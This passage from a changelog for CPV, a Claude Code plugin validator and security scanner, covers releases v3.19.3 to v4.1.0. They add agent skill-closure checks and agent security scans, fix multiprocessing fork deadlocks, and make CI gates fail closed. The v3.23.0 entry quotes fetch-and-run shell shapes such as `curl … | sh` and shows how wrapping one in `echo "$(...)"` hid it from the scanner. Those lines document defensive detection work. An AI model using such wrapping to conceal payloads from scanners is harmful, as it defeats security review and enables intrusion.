Verified END-TO-END on the real PSS shape: publish.py **byte-identical**, all five markers preserved, `rust/` tree digest unchanged. **Non-vacuity proven** by neutering the guard — all 5 positive tests fail, all 8 negative tests still pass (the negative half is load-bearing: a guard that fired too widely would silently disable `--force-templates` for everyone). **A wrong fix I nearly shipped:** the migration also CREATES a `release.yml` on PSS, and I hypothesised a duplicate-release conflict with its `build-binaries.yml`. Reading both disproved it — canon's release.yml is idempotent (`gh release view` → `edit`/`create`) and PSS's workflow commits binaries and never creates a release. No create-path guard was added.
— **#183 — a gate that blocks a release must name the errors.** `ci-preflight` reported `mypy … Found 2 errors in 1 file` and nothing else: it captured the per-error lines and reduced them to the trailing count. Generic, as the reporter suspected — of 7 FAIL sites, **5 captured the tool's output and discarded it** (mypy kept only the count; actionlint and the Mega-Linter probes kept only the FIRST line; jscpd and uv-sync-dev printed a static sentence). It costs the most on mypy specifically, because `uv run mypy` resolves against the project venv while the preflight (like CI) does not — so every local re-run says "Success" while the gate says "CI would fail", and the natural read is "flaky gate, retry". Every FAIL finding now carries the failing tool's own output, capped at 40 lines with an explicit "… and N more line(s)" (truncation is always ANNOUNCED — silently dropping output is the bug being fixed), each line keeping its own indentation so checkov/trivy/jscpd tables stay legible. PASS/WARNING stay one-line summaries and the static CIP-N detectors, which have no external output, render exactly as before. Proven end-to-end through the REAL mypy against a genuine type error (the report now names the file, the line and the message) with a clean-tree negative control, and non-vacuity proven by neutering the renderer.
— **VERIFIED-BUT-NOT-FIXED, recorded so it is not re-derived (#181 / #182):** the reporter's `resource_tracker` evidence pointed at the wrong layer — `cpv_lint_engine` fans REPO LINT out on a **ThreadPoolExecutor** (`:2415`), so the process pool they sampled belonged to a different in-flight phase; the last banner is not the stuck phase, which is what v3.23.0's per-phase START/DONE markers now disambiguate. v3.24.0's spawn pin + `ProcessPoolExecutor` satisfy #181's "switch to the API that raises". **What remains real: the wait for results is UNBOUNDED** — `future.result(timeout=timeout_per_file)` with `timeout_per_file=None` at **all 14** `parallel_scan` call sites — and CPV's existing REPO LINT / URL phase budgets **SKIP with a WARNING**, which is precisely the shape #182 argued is unsafe (a phase that could not run must never read as "found no problems"). Both are deliberately NOT bundled here: the bound has to be chosen from MEASURED scan wall-times (a cap the work cannot finish inside is #179's own defect) and it changes behavior across 14 validators plus a shipped degrade path — the v3.23.0→v3.23.1 shape. version 4.1.0, test files 440. [[lesson-verify-issue-is-not-already-shipped]] [[cpv-compiled-component-ship-only-binary-canon]] [[lesson-cannot-check-is-not-clean]] [[claim-verification]]

**v4.0.0 — BREAKING: CPV can now see an agent's REACHABLE SKILL CLOSURE — validate it, security-scan it, convert its architecture, cost-compare the variants**
— **THE GAP, proven before anything was designed:** an agent whose `skills:` list named a skill that DOES NOT EXIST scored **100/100 with zero findings**, via `validate_agent` AND via `validate_xref` over the whole plugin. `validate_agent.py` checked only that the list was a well-formed LIST of strings; `validate_xref` matched `skills/<name>` PATH shapes and blanked frontmatter out of its body scan. Claude Code "skips a missing or disabled preload and logs a warning to the debug log" — which nobody reads — so the failure is SILENT at dispatch. **The mechanism is doc-verified, and two of my own claims were WRONG until I fetched the raw docs** (a WebFetch summary had already false-negatived twice, per [[cc-spec-drift-check-method]]): (1) `skills:` frontmatter controls what is **PRELOADED, not what the agent may ACCESS** — reachability is gated by the **`Skill` tool** (`disallowedTools` shuts it, deny applied first; no `tools:` field leaves it open), so a `skills:` list is not an ACL; (2) **`agent:` alone does NOTHING** — `context: fork` is what forks a subagent, and `background` defaults to **`true`**, so a forked node returns nothing inline unless `background: false` (CC v2.1.218+). I had asserted `agent:` was the mechanism because CPV's own `SKILL_FRONTMATTER_FIELDS` accepts it — field VALIDITY is not field SEMANTICS, and that error had already reached a spec three workstreams were building against. **New `scripts/cpv_agent_closure.py` is the ONE resolver** (preload + runtime + transitive, tool-gated, `--skills-root` for a hermetic answer); `validate_agent` gained **AC1–AC5** (unresolvable preload · unreachable runtime call · gate shut with a body that still calls `Skill()` · the canon body-instruction gap · a preload that CANNOT be preloaded because it sets `disable-model-invocation: true`, which per the docs includes the bundled `/verify` and `/code-review`). A **non-vacuity guard** keeps AC1/AC2 from escalating on a resolution failure that resolved nothing: they reach MAJOR only when ≥1 OTHER named skill of the same agent resolved, so a mis-pointed `--skills-root` cannot mass-fail a valid plugin. AC4 then found a REAL defect in **CPV's own 9 agents** (~33k tokens of dead preload prefix), fixed here.
— **Single-agent security scan** (`agent-security`): an agent's attack surface is not its own file — every REACHABLE skill's body enters its context as instructions. **This landed only on the SECOND attempt, and the first is the lesson:** the initial version reused just the in-process engine and silently omitted every EXTERNAL scanner, then printed a verdict. Measured on identical payload: the plugin path returned **INVALID with 11 MAJOR** (cisco `PIPELINE_TAINT_FLOW`, snyk E004/E005/E006/W012/W013) where the agent path returned **NIT:2 and "Verdict: VALID"** — a narrow entry point reading CLEANER than the broad one is an effective suppression, so it was rejected and rebuilt. Now the external scanners run over the closure through their existing plugin-scoped entry points (zero rules copied), every scanner that could not run is recorded **SKIPPED** with a 3-state verdict that can only read INCOMPLETE or INVALID, `--require-full-coverage` exits 5, and `--no-external-scanners` documents in its own help that it cannot manufacture a green result. **A second divergence I found by dogfooding it, in the OPPOSITE direction:** `agent-security` on CPV's own `cpv-plugin-validator-agent` reported a **CRITICAL** `INTENT_SECURITY_DISABLE_INTENT` on CPV's own plugin-management SKILL.md — the prose *"Enable / Disable … Security Audit"* — while `plugin --strict` reported **zero** on the identical file. Root cause: the SHA-verified self-scan exemption is armed by `_set_cpv_self_scan`, and this entry point never called it, so `cpv_self_scan_skip` returned False unconditionally and the whole chain was a NO-OP. Fixed by arming/disarming exactly as `validate_plugin` does — **it suppresses nothing the plugin gate does not already suppress** (the exemption requires a per-file SHA match) and the finally-DISARM is mandatory, because the flag is module-global and a left-armed flag would let the NEXT plugin's scan read stale state. Two-sided: CPV's own agent 1→0 CRITICAL, while the SAME prose in a third-party plugin still fires CRITICAL.
— **`convert_agent.py`** turns one agent into **ALL-IN-ONE** (every needed skill preloaded, routing in the body) / **ONE-FOR-ALL** (the same routing, each node executing in a forked subagent) / **PLUGIN-OMNI** (exactly one skill — the plugin's skills-menu — resolved at runtime). **THE INLINING PROHIBITION is absolute** and is the user's rule, stated twice: a skill is referenced BY NAME and never copied into an agent, because a skill must stay INDEPENDENT so it can be shared and edited ONCE — an inlined copy is a second source of truth, and with N agents inlining it there are N stale copies and no signal that any drifted. Verified mechanically with sentinel tokens in skill bodies: **0 sentinels in all three generated agents**. ALL-IN-ONE and ONE-FOR-ALL are otherwise the SAME construction, differing only in WHERE a skill runs — so `one-for-all` adds `context: fork` to the SHARED skill, which changes it for every agent using it and therefore requires `--force` as explicit consent. `create_mono_agent.py` was converted OFF body-concatenation to this frontmatter model — **the breaking change that makes this a MAJOR.** Every generated variant also carries `verification-before-completion`.
— **`cpv_agent_eval.py`** compares an agent with any subset of its variants, in two tiers kept strictly apart: **Tier 1** always runs, makes ZERO LLM calls, and is a **STATIC COST** model (prefix tokens, per-invocation injected tokens, tool surface, closure size, rate-weighted N-turn projection) — it states the delta and **ranks nothing**; **Tier 2** is opt-in (`--live`) and aggregates the REAL per-run numbers a driver captured, reporting **UNKNOWN** rather than ever simulating one. A named variant with no file is shown **NOT-EVALUATED with its reason**, never dropped. **A defect I found by running it end-to-end rather than trusting its tests:** an unresolvable preload is priced at 0 tokens, which UNDERSTATES that variant — and on a real agent that made ALL-IN-ONE read as **9,264 tokens CHEAPER** than its original, when with `--skills-root` pointing at the real skills it is **13,545 tokens more EXPENSIVE**. The delta had the WRONG SIGN. The per-preload notes were present, but the headline number was not qualified, so the report now carries a **`like-for-like`** column that reads `no` (with the unpriced count per side) whenever either side had an unpriced preload — a "cannot price" must never be published as a measurement.
— Wired end-to-end: `agent-security` + `agent-eval` launcher aliases, menu rows in BOTH the rendered `skill-menus/*.json` specs AND `menu-tree.md` (they are separate sources and drift silently — the specs are what render), and one consolidated router row in `cpv-the-skills-menu`. **That router body sits at its HARD 5000-token cap** (4956 at HEAD, no override by design), so the new row required reclaiming headroom: `## Two execution surfaces` was condensed (it restated `## Instructions` steps 1–2 plus row 19). Two candidate reclaims were REJECTED after checking rather than assuming — the `## Plugin Skills` table is written by `add_component.py` and pinned by 3+ tests, and the à-la-carte alias list *claims* to duplicate the column above but **12 of its 23 aliases appear nowhere else**. It is now at 4996/5000; the next capability needs a structural reclaim, not a squeeze. version 4.0.0, scripts 134, skills 51, test files 438. [[agent-skill-closure-and-architectures]] [[lesson-agent-uncertainty-is-the-finding]] [[feedback-never-suppress-never-relax-gate]] [[claim-verification]] [[lesson-regen-hashes-last-markdown-poison]]

**v3.24.0 — ROOT-CAUSE fix for the v3.23.0 class: stop forking a multithreaded process at all, + the pre-publish Linux gate that could have caught it**
— v3.23.1 removed the one emit site that deadlocked Linux. That fixed the **INSTANCE**; the **CLASS** was still live, because CPV inherits the platform default start method (`fork` on Linux) and runs validators on a thread pool that fans out to process pools. The next latent deadlock was one careless `print()` on a worker thread away. **THE ROOT CAUSE:** two sites built pools from the platform default — `cpv_parallel_runner.py` (`ProcessPoolExecutor` with no `mp_context=`) and `cpv_scan_supervisor.py` (bare `mp.get_context()`). Both now go through a new SSOT `scripts/cpv_fork_safety.py::safe_mp_context()`, which pins **`spawn`** and can never return `fork`. **Not a speed/safety trade — measured on a cold self-validate: fork 178.1s, spawn 120.2s.** Fork was the SLOWER. Pinning spawn also deletes the asymmetry that caused the incident: macOS already defaulted to spawn, so Linux now behaves like the platform CPV has actually been tested on for its whole life, instead of the reverse. **`forkserver` was tried FIRST and REJECTED — measured, not assumed.** It is the textbook answer, is safe against this deadlock, and was *fastest* (94.7s). It **broke 5 tests** that pass under spawn: its server process is started ONCE and REUSED, so children inherit the environment captured when the server started, not the caller's current environment — and CPV is configured through env vars (`CPV_SCAN_CACHE`, `CLAUDE_PRIVATE_USERNAMES`, the parallelism escape hatch). A variable set after the first pool was created would silently never reach a worker: **worse than the deadlock, because it fails QUIETLY with wrong results instead of hanging.** Each failing test passed in ISOLATION and failed in sequence — the signature of server reuse. 25s is not worth a stale-environment bug class; the rejection is recorded in the module and regression-locked by a test, because forkserver is a standing temptation. **THE PRE-PUBLISH LINUX GATE (the user's ask).** The honest problem was that the local gate is macOS-only and *cannot* see a fork defect. Rather than reach for Docker, the fix exploits the fact that **the deadlock is not Linux-specific — only the DEFAULT is**: forcing the interpreter default to `fork` reproduces it on macOS. Proven by direct experiment before any code was written — 8 threads hammering `sys.stderr` while the main thread forks left **3/3 children hung**; under spawn, 300 rounds, zero. New `scripts/cpv_fork_parity.py` forces the default via a temporary `sitecustomize.py` on `PYTHONPATH` (so it reaches SUBPROCESSES — load-bearing, because the v3.23.0 deadlock happened in a subprocess the suite spawned, not in pytest's own process) and re-runs the suite; it **chains to any project sitecustomize** rather than shadowing it. Wired as publish **Gate 3c**, serial and strictly before the bump/commit/tag/push, so a hang aborts with the tree untouched. **Verified two-sided against the real defect: v3.23.0's code under `spawn` passed 16 tests (BLIND); the same code under `fork` FAILED with `TimeoutExpired` — CI's exact signature; the fixed code under `fork` passes 37 in 15.4s.** It skips as `already-native` on Linux (never doubles CI), degrades to WARNING where fork is absent, and treats a **TIMEOUT as a failure** because a hang IS the signature — "cannot check" is never reported as clean, but never blocks either. Full suite under forced fork: **11510 passed, 162s.** **CANON:** the generated `publish.py` gains a self-detecting **G4b** (runs only when the plugin's own Python creates pools; same degrade-gracefully idiom as G2b–G2f; cleans up its temp sitecustomize in a `finally` so it cannot dirty the tree), plus a new "Fork safety" section in `cpv-canonical-pipeline/references/parallelism.md` with the WRONG/RIGHT snippets and the forkserver rejection — because the tool's own repo is the LEAST important instance of a defect it hands out. **GUARDS:** a SOURCE-level invariant (`tests/test_fork_safety.py`) forbids `ProcessPoolExecutor` without `mp_context=`, bare `mp.get_context()`, and `multiprocessing.Pool` anywhere in `scripts/` — a source check because the deadlock needs a fork race, so a behavioural test would flake while the invariant is exact (same reasoning as v3.19.2's `threading.Barrier`); proven two-sided by reintroducing the regression (2 tests fail, clean after restore) and guarded against vacuity. Also removed a now-dead `import multiprocessing` (no ghosts) and added a real `fork-parity` subcommand so the command the gate prints on failure actually exists. +65 two-sided tests; ruff + mypy(135) clean. version 3.24.0, scripts 130, test files 434. [[lesson-green-macos-suite-does-not-prove-linux-fork]] [[claim-verification]] [[feedback-never-suppress-never-relax-gate]] [[lesson-fix-what-the-tool-emits-not-just-its-own-tree]] [[maintain-project-claude-md]]

**v3.23.1 — HOTFIX: the v3.23.0 progress markers deadlocked every Linux run (fork × threads × stderr)**
— v3.23.0 shipped green on a full local macOS suite (11484 passed) and then **failed BOTH CI and Release** on the same test: `validate_plugin.py --json <tiny fixture>` timed out at 300s, always on the `parallel=True` subprocess, where the same test takes **8.7s** locally. **Cause:** v3.23.0 emitted the phase markers from inside `_run_one_validator`, i.e. on **ThreadPoolExecutor worker threads** — the first time worker threads wrote to stderr. Several validators fork process pools internally, and **on Linux multiprocessing defaults to FORK**. Forking a multithreaded process copies mutex state, so a worker holding `sys.stderr`'s internal lock at the instant of a fork leaves the child with that lock **held by a thread that does not exist there** — the child hangs on its first write. **macOS defaults to spawn**, which is exactly why a fully green local suite proved nothing. Fix: emit from the **dispatching thread** in `_run_parallel_batch` (START as each task is submitted, DONE in a `finally` as each future resolves, so a crashed validator still reports DONE and cannot masquerade as the stuck phase). The diagnostic contract is unchanged — a killed run still ends with STARTs that never got a DONE — and no worker thread touches stderr. Pinned by a SOURCE-level assertion (`test_no_progress_marker_is_emitted_from_a_worker_thread`): the deadlock needs a fork race to reproduce, so a behavioural test would be flaky, whereas "workers never touch stderr" is exact and cheap. **The durable lesson: a green macOS suite does not prove the Linux fork path — any change that makes threads do I/O needs a Linux check before publish.**

**v3.23.0 — a reported FP led to TWO security FALSE NEGATIVES, plus #180's genuinely-open half (per-phase progress) and marketplace `tee` parity**
— **THE FN THAT MATTERS: `echo "$(curl … | sh)"` was reported as NOTHING while the bare `curl … | sh` is CRITICAL.** `_match_inside_shell_echo_string` suppressed any execution-class match inside a quoted argument to `echo`/`printf`/`cat` **without distinguishing the quote style**. Single quotes are literal; double quotes are NOT — `$(...)` and backticks are substituted by the shell BEFORE the display command is ever invoked, so the pipeline runs exactly as if unwrapped. **Any payload could be hidden from CPV by wrapping it in `echo "…"`.** Now the suppression is scoped to the SUBSTITUTION SPANS: a match inside a `$(...)`/backtick span in a double-quoted body is executed, so it fires; text printed beside it stays suppressed. **My first attempt declined the WHOLE body and that was wrong** — measuring it showed two new FPs (`echo "Found $(ls | wc -l) files; use sudo apt install jq"` drew a CRITICAL on the *printed* `sudo`, and `$(( … ))` **arithmetic** expansion — which runs no command — was read as a substitution). The rationale I had used to reject attribution ("the substitution's own findings would be suppressed by this same helper") was simply false: those matches lie INSIDE the span, so attribution is both more precise AND still FN-safe. `$((` is now excluded in the shared helper, which fixes the same latent over-match on the heredoc path. **Second FN:** `_is_shell_comment_line` matches `^\s*#`, but a `#` only opens a comment when the line STARTS outside a string; with a double quote still open from an earlier line it is string content and the backticks beside it execute — that was cleared as a comment. **The FP that started it (#180):** a `run:` body IS shell, so a `#` comment in it is documentation the shell never executes — but the YAML classifier never reached the shell classifier's comment rule, and explaining a shell change in a comment naturally means markdown inline code (``# `| tee` instead of `> file`…``), which scored CMD_INJECTION → NIT → red gate under `--strict`. **How it was found, and the lesson:** CPV's own workflows carry backticks in `run:` comments and self-validate clean, which could have read as "already handled" — it is not. The reporter's LONG line was cleared **by accident**, by an unrelated multi-backtick-span helper (#88) needing ≥2 spans; their ONE-span sibling fell through to NIT. The rule was never principled. **When a report says "this shape is fine on your side", test the shape's smallest member — the passing case may be passing for an unrelated reason.** One primitive fixes all three: `_shell_quote_state_at_line_start` lexes forward returning `normal`/`sq`/`dq`/**`unknown`**, where `unknown` (a heredoc — not lexed like ordinary shell) is deliberately DISTINCT from `normal` so an unmodelled construct can never be mistaken for proof of inertness. Both FN fixes are pure TIGHTENINGS (only `dq` is declined; `sq`/`unknown` keep their historical verdict, so no existing FP fix can regress); only the comment clear ADDS suppression, so it carries the strictest gate (genuine comment AND positively-`normal` AND execution-class only). **Scope guard:** `_SHELL_EXECUTION_CLASS_RULES` excludes every prose-vector rule, so `PROMPT_INJECT`/`INDIRECT_PROMPT_INJECT`/`A2A_*` in a comment stay VISIBLE — an agent reading a workflow still sees comment text. A test caught a real bug in my own regex: `search` finds `<<` at offset 1 inside a `<<<` herestring, so a herestring was misread as a heredoc (fixed with a `(?<!<)` lookbehind). 29 two-sided tests (TRDD-3GW4LWUH).
— **#180's SECOND ASK, now delivered.** The reporter asked for `tee` **or** per-phase progress; v3.22.0 shipped the `tee`, which preserves whatever was emitted — but the validator emitted almost nothing before its final report, so a killed job still could not be attributed to a phase. I said so publicly rather than closing the issue. Now all **47** phases (the parallel batch via `_run_one_validator`, plus every serial Phase 1/3 step via a new `_serial_phase`) announce `START` before running and `DONE <elapsed>` after, to **stderr only** (the `--json` contract is stdout = the JSON object ONLY) with `flush=True` — the explicit flush the validator never had. A killed run therefore ends with `START`s that never got a `DONE`, and those are exactly the phases in flight. **ON BY DEFAULT** (`PLUGIN_PROGRESS=0` silences): the whole value is being there for the hang you did NOT predict, and an opt-in flag is useless in exactly that case. **Verified by OBSERVING it** — a test actually kills a run and reconstructs the stuck phase from the log, which is the discipline #180 taught me twice; the reporter's own hang phase (`validate_md_content_references`, the dead-link sweep) is instrumented. **Going from ~0 to ~90 stderr lines introduced a crash vector I had to find by testing for it:** `cpv-remote-validate … 2>&1 | head` closes the pipe, and an unguarded write raises `BrokenPipeError` (verified, as does a closed stderr → `ValueError`) — a validation failing because nobody was reading its log. The emitter now swallows `OSError`/`ValueError`; that is the one place swallowing is right, because a progress marker is diagnostics and must never be a gate.
— **Marketplace lineage brought to `tee` parity.** `generate_marketplace_repo.py` was already FAIL-CLOSED (the shared `_cpv_verdict_shell` does the RC-8 classification, so there was no gate hole), but its 3 validator call sites still used the blind `> file 2>&1` + `$?` shape, and the helper OPENED with a `cat` of the report — which a job killed at its timeout never reaches. Now `2>&1 | tee`, `${PIPESTATUS[0]}`, quoted expansions, `PYTHONUNBUFFERED`, and no `cat`. Both traps this lineage inherits were already paid for once on the plugin side: `$?` after a pipeline is `tee`'s status (GitHub's default `run:` shell is `bash -e {0}` WITHOUT `-o pipefail`) and shellcheck cannot infer numeric-ness through `PIPESTATUS` → SC2086 → red CI. actionlint on the emitted workflow: exit 0.

**v3.22.3 — `PYTHONUNBUFFERED` on the validate step, plus a CORRECTED account of what the `tee` does (two self-corrections; the second supersedes the first)**
— **What is TRUE and load-bearing:** the `tee` (v3.22.0) is required. With `> file 2>&1` + a trailing `cat`, a job killed at its `timeout-minutes` NEVER reaches the `cat`, so the log shows literally nothing about what was in flight. With `tee`, whatever the validator has emitted so far is in the log. Separately, the v3.22.2 run log **confirmed `${PIPESTATUS[0]}` was necessary rather than defensive**: GitHub's default `run:` shell is `bash -e {0}` **without** `-o pipefail`, so `$?` after the pipeline really would have been `tee`'s status — success for every failed validation.
— **FIRST correction (superseded).** I told the #180 reporter the tee meant "a killed run shows how far it got", then measured CPV's own v3.22.2 log: of 1803 lines, 6 at step start, 2 mid-run, **1795 in one burst at exit**. I attributed that to Python block-buffering stdout into a pipe and shipped `PYTHONUNBUFFERED=1` as "the part that actually streams".
— **SECOND correction — that diagnosis was WRONG, and the v3.22.3 release run disproved it.** With `PYTHONUNBUFFERED` confirmed present in the step env, the distribution was **essentially unchanged**: 7 / 2 / 1 / **1794 at exit**. The end-burst is not buffered output waiting to flush — it is the **final report, which `validate_plugin` produces at the end by program structure**. No amount of unbuffering can stream output the program has not generated yet. (`grep flush=True` over the validator: zero hits, so the 2 mid-run lines in v3.22.2 were a 4-8 KB buffer FILLING, not an explicit flush — which is why unbuffering buys finer granularity and nothing more.)
— **Net:** `PYTHONUNBUFFERED` is KEPT — it makes the phase banners (`═══ [REPO LINT] ═══`, `Detected languages…`) appear at their true time instead of whenever a buffer happens to fill, and *that* is what identifies a stuck phase. It is a small, correct improvement with a rationale I twice overstated. **The honest residual gap: CPV emits few progress markers, so "which phase is stuck" is only partially answerable — the reporter's "per-phase progress on stderr" ask is a real feature, still OPEN, and is not what this release delivered.** actionlint: exit 0 on own + emitted.
— **Lesson (the durable one): a fix whose whole purpose is observability must be verified by OBSERVING it, and a plausible mechanism is not a measured cause.** I shipped a correct change for a wrong reason, and only re-measuring caught it. See [[lesson-bounded-per-item-unbounded-in-aggregate]] for the sibling habit — check the phase, not the plausible story.

**v3.22.2 — CPV's OWN release gate was FAIL-OPEN (found by dogfooding the v3.22.0/.1 fix)**
— CPV ships an RC-8 fail-closed handler to every plugin it scaffolds, and v3.22.1 fixed the canon docs that still taught the fail-open shape. **Its own `release.yml` had the same hole the entire time:** it errored only on `exit_code -ge 1 && -le 4` with NO else-branch, so `command not found` (127) or an OOM kill (137) **silently passed and the release proceeded on a validation that never ran**. CPV's verdict codes stop at 4, so anything else is the validator failing to run — never a clean result. Now fail-closed: exit 0 passes, exit 1-4 **and** CPV's own `SUMMARY: CRITICAL=` marker is a real verdict, anything else is an explicit `FAILED TO RUN` → `exit 1`. Also dogfoods #180's diagnosability half — `tee` instead of `> file` + a trailing `cat` (a job killed at its cap never reaches the `cat`, so the log shows nothing), `${PIPESTATUS[0]}` so the exit code is the VALIDATOR's rather than `tee`'s, and quoted `$exit_code` (shellcheck cannot infer numeric-ness through PIPESTATUS → SC2086 → red CI). `--no-color` is deliberately KEPT — the report is a release asset, and ANSI escapes in it made the validator flag its own output (v2.107.1). actionlint on CPV's own workflows: exit 0. Guarded by `test_own_release_gate_is_fail_closed.py`, verified two-sided against the pre-fix workflow (4 of 5 detectors fire on it; the 5th is a preservation test that correctly passes both). **This is the third population of [[lesson-fix-what-the-tool-emits-not-just-its-own-tree]] — the tool's OWN tree — and the easiest to forget precisely because the fix is "already shipped" everywhere else.**

**v3.22.1 — the canon REFERENCE DOCS still taught shapes the generator no longer emits (drift found by the #179/#180 propagation audit)**
— agents author workflows by READING `skills/cpv-setup-plugin-repo/references/*.md`, so a stale recipe re-introduces the defect the generator was just fixed for. That has happened before: v2.137.1 found the references PRESCRIBING an inverted `CLAUDE_PRIVATE_USERNAMES`, so every upgrade re-created #140. Two divergent copies, one worse than a style drift: the ci.yml recipe still used `> file 2>&1` + a trailing `cat` (the exact shape v3.22.0 removed — a hung run is indistinguishable from a healthy one, and a job killed at its cap shows nothing at all), and the release.yml recipe **predated RC-8 entirely** — it errored only on exit 1-4 and fell through otherwise, so `uvx: command not found` (127) or an OOM kill (137) **SILENTLY PASSED** the gate. A fail-open handler was being taught as canon. Both now match the shipped generator (tee · `${PIPESTATUS[0]}` · quoted `$exit_code` · the fail-closed handler requiring CPV's own SUMMARY line as proof the validator ran). Rather than fix each instance and wait for the next drift, `test_canon_docs_match_shipped_recipe.py` pins the PROPERTIES — scoped to the blocks that actually invoke the validator so unrelated shell in the docs is never flagged, plus a guard asserting the scoping still matches something (a scoping regex that stopped matching would let every check pass over an empty list). Verified two-sided against the pre-fix doc: all four detectors FIRE on it, all pass on the fixed one. Docs + test only; no scanner or gate change.

**v3.22.0 — two canonical-pipeline defects the fleet actually hit: an unsatisfiable test gate (#179) and a silent 30-min validate hang (#180)**
— **#179 (TRDD-10HB2U7K).** The emitted `publish.py`'s `run()` helper hardcoded `subprocess.run(..., timeout=300)` and BOTH pytest call sites inherited it. 300s is right for a lint/scan step; a real suite runs for minutes — so on any plugin whose suite exceeds five minutes gate **G4 could never pass** (the reporter's 13,618-test suite reached 47% at the cap and the gate killed its own run). A cap the suite cannot finish inside does not make the gate stricter, it makes it **unprovable**: the run asserts nothing while still printing red, and a timeout is indistinguishable from a hang. `run()` KEEPS its 300s default so every other call site still fails fast — widening it for everyone was the easy fix and the wrong one; only the two pytest sites get the wider bound. The bound is **overridable** (`PLUGIN_TEST_SUITE_TIMEOUT`, default 1800s) rather than a bigger constant, because a fixed bound IS the defect — 300→1800 alone just moves the cliff; a non-positive/unparseable override falls back to the default and can never shorten it. The expiry message reports the ACTUAL bound (a hardcoded `300s` starts lying the moment any caller overrides it). **The half that made it reach anyone:** fixing the generator only helps plugins scaffolded AFTER the fix — standardize never overwrites an existing `publish.py` on a plain `--fix`, and the plugins that hit this are exactly the ones that cannot safely `--force-templates`. So `migrate_publish_py_test_suite_timeout` mirrors the existing `migrate_publish_py_dependency_tag`: surgical, idempotent, on ANY `--fix`, lifting every replacement VERBATIM out of freshly generated canon (a second copy of the canonical text is the same duplicate-source defect this repairs, and would drift the first time the generator's wording changed). The resolver+`run()` rewrite is a PREREQUISITE, not a best-effort edit — both other sites reference `_test_suite_timeout`, so applying either alone would leave a `publish.py` that `NameError`s at push time; an unrecognised shape is left **byte-identical** and reported. A test asserts the migrated file is byte-identical to freshly generated canon, so migrator and generator cannot silently diverge. Also fixed the stale copy in `cpv-setup-plugin-repo/references/plugin-hooks-and-scripts.md` — what an agent READS to author the gate.
— **#180 (TRDD-9UIUK9XA).** A downstream validate step ran 25-30 min, was killed by its own cap, produced NO output, and shipped a release with missing assets. The reporter's timestamps disprove the cause CPV's own comments blamed: **CPV built 4 seconds into the step**. Root cause, verified first-hand: `validate_md_urls` is called **once per markdown file** and its per-host semaphores are **scoped to a single call**, so the throttling that would pace a burst resets on every file and the phase grows with (files × URLs) — each request bounded (8s + bounded retries), their SUM bounded nowhere. That is exactly the "bounded per item, unbounded in aggregate" defect **#162** fixed for REPO LINT, still open for this phase (which is why #162's remedy did not help). Ruled out by reading code, not assuming: REPO LINT is capped at 600s since v2.157.2 (the reporter's pin HAS it) and the external scanners are not in this path at all (`validate_plugin.py:2552`). Fix: ONE deadline spanning **every file** (a per-call bound would reset per file and leave the aggregate as unbounded as before), 300s default, `PLUGIN_URL_CHECK_PHASE_TIMEOUT`-overridable with the same typo-safe fallback as `_phase_timeout`. A skipped URL is **SKIPPED, never DEAD**, and deliberately NOT cached — we never contacted it, so calling it dead would be a fabricated finding and caching it alive would let a later file trust a check that never ran; the overrun is ONE **WARNING** (never blocks, so an unchecked link cannot fail a plugin that may have none broken). **Diagnosability:** the step now `tee`s instead of `> file` + a trailing `cat` — with the redirect a healthy run and a hung one were byte-identical in the log for the whole window, and a job killed at its cap never reached the `cat`; `${PIPESTATUS[0]}` keeps the exit code the VALIDATOR's (reading `$?` after a pipeline reports `tee`'s status and would green every failed validation). Every `$exit_code` use is now **quoted** — shellcheck could infer numeric-ness through `exit_code=$?` but cannot through PIPESTATUS, and a stashed-baseline A/B proved the unquoted form NEWLY trips SC2086, which the generated Lint job's actionlint would surface as red CI on every scaffolded plugin (emitted workflows: actionlint **exit 0, 0 findings**, baseline also 0). The four "cold-install ceiling" comments are corrected — they sent triage to the ref and the pin when the caches they describe are already present and the build is seconds. 36 two-sided tests; ruff + mypy(133) clean.

**v3.21.0 — `cpv-agent` self-heals broken agent definitions at launch (TRDD-QK4M8T2R)**
— A broken agent definition fails **silently**: an MCP grant written `mcp__server-*` (single separator) matches no real tool id (`mcp__server__<tool>`), so every call is denied with no error; a duplicated top-level frontmatter key parses cleanly while YAML keeps only the LAST value, silently discarding the first `tools:` list. Nothing surfaces either at dispatch time, so they rot until an agent is inexplicably unable to act. v3.18.0 shipped the DETECTORS (D1 dup-key · D2 MCP grant · D3 shell fence · D6 tools∩disallowedTools) but nothing ran them automatically. New `scripts/cpv_agent_preflight.py` + a **Step 0** in `cpv-agent`: on every launch it resolves the agent dirs in scope (the target plugin's `agents/`, the project's `.claude/agents/`, the user-scope `~/.claude/agents/`), de-duplicates by RESOLVED path (a duplicate would be handed to the fixer twice), and exits `0` CLEAN / `1` FINDINGS / `2` ERROR. On FINDINGS `cpv-agent` dispatches **`cpv-plugin-fixer-agent`** on exactly the listed files — it never hand-edits — re-checks, then proceeds with the request it was actually dispatched for. Two guards against the cure being worse than the disease: only BLOCKING severities reach the fixer (INFO/advisory excluded, or every unrelated launch would rewrite the user's agent files), and a second identical result reports `[BLOCKED]` rather than looping. `2` is reported as UNKNOWN, never folded into "clean". Severity policy is NOT forked — the script reuses `exit_code_strict()`. Verified two-sided on real corpora: the pre-fix agent backup → exit 1 with 4 blocking (dup key, 2× dead MCP grant, hardcoded path), the fixed corpus → exit 0 with 33 scanned, in 0.37s.

**v3.19.3 — the lint engine reads SHEBANGS, so extensionless scripts stop being invisible (TRDD-H2WD3FN9)**
— v3.19.2 fixed the vacuous-green git-hook lint **for CPV's own repo only**, via an `extend-include` line in its `pyproject.toml`. That is a per-repo workaround, and CPV's job is validating **other people's** plugins, which it cannot assume have configured ruff correctly. Worse, CPV **ships the blind spot downstream**: `generate_plugin_repo.py` installs `git-hooks/pre-push` into every plugin it scaffolds (`:2159-2178`) while `gen_pyproject_toml` emitted only `extend-exclude` — so every scaffolded plugin carried an extensionless Python hook that neither CPV's gate nor its own CI would ever read. `detect_languages()` bucketed **purely by filename glob** (`collect("python", ["*.py"])`), so a `#!/usr/bin/env python3` file with no suffix landed in no bucket at all. **Engine fix:** `_shebang_language()` reads the first 256 bytes as BYTES (binary-safe — no decode of arbitrary content), requires `#!` at offset 0 (the kernel honours it nowhere else), steps over `env` indirection including `-S` flags and `VAR=value` assignments, strips version tails (`python3.12`→`python`), and maps ONLY into languages this engine actually lints — an unknown interpreter like `#!/usr/bin/perl` returns `None` rather than being fed to ruff. One extra `gi.rglob("*")` pass buckets **suffix-less** files only (a `.txt` opening with `#!` is not a script) and skips anything a glob already claimed, so suffix-less `Dockerfile` is not double-linted. **This TIGHTENS the gate, deliberately:** a plugin with a dirty extensionless script that used to pass now correctly fails. Proven two-sided end-to-end on an identical fixture — plain `ruff check git-hooks/` says `No Python files found` 